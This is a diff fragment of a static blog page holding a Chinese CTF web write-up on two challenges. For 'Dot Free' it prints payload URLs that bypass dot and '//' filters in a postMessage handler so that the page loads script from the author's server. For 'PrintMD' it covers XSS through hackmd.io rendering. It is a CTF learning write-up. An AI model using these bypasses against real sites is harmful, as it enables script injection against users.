+<h2 id="Dot-Free"><a href="#Dot-Free" class="headerlink" title="Dot Free"></a>Dot Free</h2><p><img src="/images/2018-07-29-17-58-50.png" alt=""><br>题目乍一看仿佛是SSRF<br>于是我进行了一些测试，发现ip2long：<br><img src="/images/2018-07-29-18-00-51.png" alt=""><br>是可以请求的，但是我尝试了自己的vps，根本收不到请求<br>在迷茫之际，发现源代码中<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(<span class="string">'message'</span>, function (e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.data.iframe) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.data.iframe &amp;&amp; e.data.iframe.value.indexOf(<span class="string">'.'</span>) == -<span class="number">1</span> &amp;&amp; e.data.iframe.value.indexOf(<span class="string">"//"</span>) == -<span class="number">1</span> &amp;&amp; e.data.iframe.value.indexOf(<span class="string">"。"</span>) == -<span class="number">1</span> &amp;&amp; e.data.iframe.value &amp;&amp; typeof(e.data.iframe != <span class="string">'object'</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (e.data.iframe.type == <span class="string">"iframe"</span>) &#123;</span><br><span class="line">                    lce(doc, [<span class="string">'iframe'</span>, <span class="string">'width'</span>, <span class="string">'0'</span>, <span class="string">'height'</span>, <span class="string">'0'</span>, <span class="string">'src'</span>, e.data.iframe.value], parent);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    lls(e.data.iframe.value)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="keyword">false</span>);</span><br><span class="line">    window.onload = function (ev) &#123;</span><br><span class="line">        postMessage(JSON.parse(decodeURIComponent(location.search.substr(<span class="number">1</span>))), <span class="string">'*'</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>相当可疑<br>于是我查阅了一下postMessage<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</span><br></pre></td></tr></table></figure></p>
+<p>发现<br><img src="/images/2018-07-29-18-09-17.png" alt=""><br>于是这进一步确实了我的想法<br>既然确定了问题点，那么肯定是构造payload进行测试<br>首先确定payload的输入点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decodeURIComponent(location.search.substr(1))</span><br></pre></td></tr></table></figure></p>
+<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">window.location</span><br><span class="line">window的location对象</span><br><span class="line"></span><br><span class="line">search</span><br><span class="line">得到的是url中?部分</span><br><span class="line"></span><br><span class="line">substr()</span><br><span class="line">返回一个从指定位置开始的指定长度的子字符串</span><br><span class="line">这里设置为1，是为了把url中的?号去掉</span><br></pre></td></tr></table></figure></p>
+<p>于是可以确定format为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://13.57.104.34/?payload</span><br></pre></td></tr></table></figure></p>
+<p>然后是<code>JSON.parse</code><br>说明要传入一个json_encode<br>那么根据题目的意图<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (e.data.iframe &amp;&amp; e.data.iframe.value.indexOf(&apos;.&apos;) == -1 &amp;&amp; e.data.iframe.value.indexOf(&quot;//&quot;) == -1 &amp;&amp; e.data.iframe.value.indexOf(&quot;。&quot;) == -1 &amp;&amp; e.data.iframe.value &amp;&amp; typeof(e.data.iframe != &apos;object&apos;))</span><br></pre></td></tr></table></figure></p>
+<p>我们肯定是要bypass这段的，但是我们希望我们构造的payload是可以成功打到自己vps的<br>但是<code>//</code>不能使用，于是想到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:/\</span><br></pre></td></tr></table></figure></p>
+<p>这样的Bypass<br>并且不能使用dot，我们还是选择ip2long<br>然后进入if..else后<br>我们肯定希望程序进入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">         lls(e.data.iframe.value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>因为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function lls(src) &#123;</span><br><span class="line">        var el = document.createElement(&apos;script&apos;);</span><br><span class="line">        if (el) &#123;</span><br><span class="line">            el.setAttribute(&apos;type&apos;, &apos;text/javascript&apos;);</span><br><span class="line">            el.src = src;</span><br><span class="line">            document.body.appendChild(el);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></p>
+<p>这样可以把我们的src添加到<code>document.body</code><br>即可触发恶意操作<br>于是构造<br><img src="/images/2018-07-29-19-33-14.png" alt=""><br>尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://13.57.104.34/?&#123;%22iframe%22:&#123;%22value%22:%22http:/\\2130706433:23333%22&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现收到回显<br><img src="/images/2018-07-29-19-34-48.png" alt=""><br>下一步一气呵成<br>在自己的index.html中写入<br><img src="/images/2018-07-29-19-47-00.png" alt=""><br>然后再请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://13.57.104.34/?&#123;%22iframe%22:&#123;%22value%22:%22http:/\\2130706433%22&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>即可收到<br><img src="/images/2018-07-29-19-47-26.png" alt=""></p>
+<h2 id="PrintMD"><a href="#PrintMD" class="headerlink" title="PrintMD"></a>PrintMD</h2><p><img src="/images/2018-07-28-12-35-39.png" alt=""><br>题目有唯一一个功能<br><img src="/images/2018-07-28-12-35-57.png" alt=""><br>我们访问这个文档<br><img src="/images/2018-07-28-12-36-13.png" alt=""><br>可以知道：该功能可以渲染hackmd.io的markdown文档，并把它解析打在html前端上<br>然后flag在根目录<br>这里想到，应该是有任意文件读取的漏洞，或者直接可以getshell<br>结合之前的知识，解析的时候或许会存在xxe，或者模板渲染等问题<br>但是先不管这么多，先简单测试一下<br>我们再hackmd.io上写一个文档<br><img src="/images/2018-07-28-12-38-06.png" alt=""><br>然后让该网站去请求并print<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://54.183.55.10/print?url=https%3A%2F%2Fhackmd.io%2FLRDMccAHSKqSPhuayRXeBA</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-07-28-12-38-54.png" alt=""><br>发现xss成功<br>但是该网站并不存在明显的管理员后台，或是需要攻击的cookie，所以XSS这里暂且搁置<br>接着我在想，是否可能是该网站接受hackmd.io提供文档内容的接口的时候引发了漏洞？<br>这里就需要先探究一下hackmd.io提供文档内容的接口提供的内容格式<br>后来发现了hackmd.io的文档内容下载接口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackmd.io/xxxx/download</span><br></pre></td></tr></table></figure></p>
+<p>我们下载刚写的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackmd.io/LRDMccAHSKqSPhuayRXeBA/download</span><br></pre></td></tr></table></figure></p>
+<p>发现下载文件是<br><img src="/images/2018-07-28-12-41-47.png" alt=""><br>并不是我想象中的xml<br>那么是否是后台解析markdown语法的时候可能存在漏洞？或者是渲染成html的时候有模板注入？<br>这时候我去关注了一下该网站的开发框架，发现是：<code>Nuxt.js通用应用框架</code><br>Nuxt.js 是一个基于 Vue.js 的通用应用框架，它是使用 Webpack 和 Node.js 进行封装的基于Vue的SSR框架，使用它，可以不需要自己搭建一套SSR程序，而是通过其约定好的文件结构和API就可以实现一个首屏渲染的Web应用。<br>搜索一下是否存在公开漏洞，发现无果，此题搁置</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>跪膜巨佬1小时日2道web XD，我还是太年轻了，尽走弯路= =</p>
 
     </article>
     <!-- license  -->
@@ -430,16 +442,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/08/23/浅析xml之xinclude-xslt/" title= 浅析xml之xinclude & xslt >
-                    <div class="nextTitle">浅析xml之xinclude & xslt</div>
+                <a href= "/2018/08/17/php函数默认配置引发的安全问题/" title= php函数默认配置引发的安全问题 >
+                    <div class="nextTitle">php函数默认配置引发的安全问题</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/30/ISITDTU-CTF-Web/" title= ISITDTU CTF-Web >
-                    <div class="prevTitle">ISITDTU CTF-Web</div>
+                <a href= "/2018/08/17/xss-ssrf-redis/" title= xss->ssrf->redis >
+                    <div class="prevTitle">xss->ssrf->redis</div>
                 </a>
             
         </li>
@@ -455,7 +467,7 @@ height:50vh;
 <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
 <script>
     var gitment = new Gitment({
-        id: "Wed Aug 15 2018 21:50:48 GMT+0800", // 可选。默认为 location.href
+        id: "Fri Aug 17 2018 12:33:51 GMT+0800", // 可选。默认为 location.href
         owner: 'skyofkinglove',
         repo: 'sky.github.io',
         oauth: {
@@ -559,7 +571,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息搜集"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql探测"><span class="toc-number">3.</span> <span class="toc-text">sql探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入语句构造"><span class="toc-number">4.</span> <span class="toc-text">sql注入语句构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注入脚本编写"><span class="toc-number">5.</span> <span class="toc-text">注入脚本编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#登入admin"><span class="toc-number">6.</span> <span class="toc-text">登入admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">7.</span> <span class="toc-text">后记</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Advertisement"><span class="toc-number">2.</span> <span class="toc-text">Advertisement</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BookHub"><span class="toc-number">3.</span> <span class="toc-text">BookHub</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dot-Free"><span class="toc-number">4.</span> <span class="toc-text">Dot Free</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrintMD"><span class="toc-number">5.</span> <span class="toc-text">PrintMD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -572,6 +584,32 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -2897,62 +2935,62 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2018/08/29/浅析xml及其安全问题/" >浅析xml及其安全问题</a>
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/浅析xml之xinclude-xslt/" >浅析xml之xinclude & xslt</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/28</span><a class="archive-post-title" href= "/2018/08/28/RealWorldCTF-Web/" >RealWorldCTF-Web</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/SOAP及相关漏洞研究/" >SOAP及相关漏洞研究</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/27</span><a class="archive-post-title" href= "/2018/08/27/php函数默认配置引发的安全问题/" >php函数默认配置引发的安全问题</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/php函数默认配置引发的安全问题/" >php函数默认配置引发的安全问题</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2018/08/26/Upload-labs&Upload Bypass Summarize/" >Upload-labs&Upload Bypass Summarize</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/RealWorldCTF-Web/" >RealWorldCTF-Web</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2018/08/26/MeePwn-Web-复现/" >MeePwn-Web-复现</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/xss-ssrf-redis/" >xss->ssrf->redis</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/SOAP及相关漏洞研究/" >SOAP及相关漏洞研究</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/浅析xml及其安全问题/" >浅析xml及其安全问题</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/从一道CTF题引发的思考/" >从一道CTF题引发的思考</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/一道CTF题引发的思考-sql注入/" >一道CTF题引发的思考-sql注入</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/inndy-crypto-writeup/" >inndy-crypto-writeup</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/Upload-labs&Upload Bypass Summarize/" >Upload-labs&Upload Bypass Summarize</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2018/08/24/xss-ssrf-redis/" >xss->ssrf->redis</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/inndy-crypto-writeup/" >inndy-crypto-writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2018/08/23/浅析xml之xinclude-xslt/" >浅析xml之xinclude & xslt</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2018/08/15/一道CTF题引发的思考-sql注入/" >一道CTF题引发的思考-sql注入</a>
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2018/08/15/从一道CTF题引发的思考/" >从一道CTF题引发的思考</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/ISITDTU-CTF-Web/" >ISITDTU CTF-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/MeePwn-Web-复现/" >MeePwn-Web-复现</a>
         </li>
     
     
@@ -3177,12 +3215,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
         </li>
     
     
